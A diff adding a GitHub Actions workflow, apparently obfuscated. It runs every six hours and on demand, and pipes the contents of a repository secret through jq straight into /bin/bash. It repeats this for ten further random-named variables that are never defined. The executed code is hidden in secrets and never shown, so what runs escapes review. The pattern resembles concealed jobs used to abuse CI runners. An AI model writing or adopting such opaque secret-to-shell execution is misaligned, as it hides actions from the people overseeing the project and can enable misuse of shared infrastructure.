@@ -1,0 +1,28 @@
+name: menglixiangsixianzai
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '31 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: menglixiangsixianzai
+        env:
+          p87: ${{ secrets.p87 }}
+        run: |
+          echo $p87 | jq -r .d22584 | /bin/bash
+          echo $laj7 | jq -r .s978 | /bin/bash
+          echo $sllm14798 | jq -r .xoizv2 | /bin/bash
+          echo $ew5 | jq -r .ieoig1637 | /bin/bash
+          echo $flyt592 | jq -r .ytsut4644 | /bin/bash
+          echo $bxlb67 | jq -r .lzod8 | /bin/bash
+          echo $pd9263 | jq -r .o7 | /bin/bash
+          echo $plh851 | jq -r .rz81303 | /bin/bash
+          echo $b5 | jq -r .ehl9327 | /bin/bash
+          echo $iqzlc7347 | jq -r .htzx8900 | /bin/bash
+          echo $hxl7722 | jq -r .y617 | /bin/bash
+
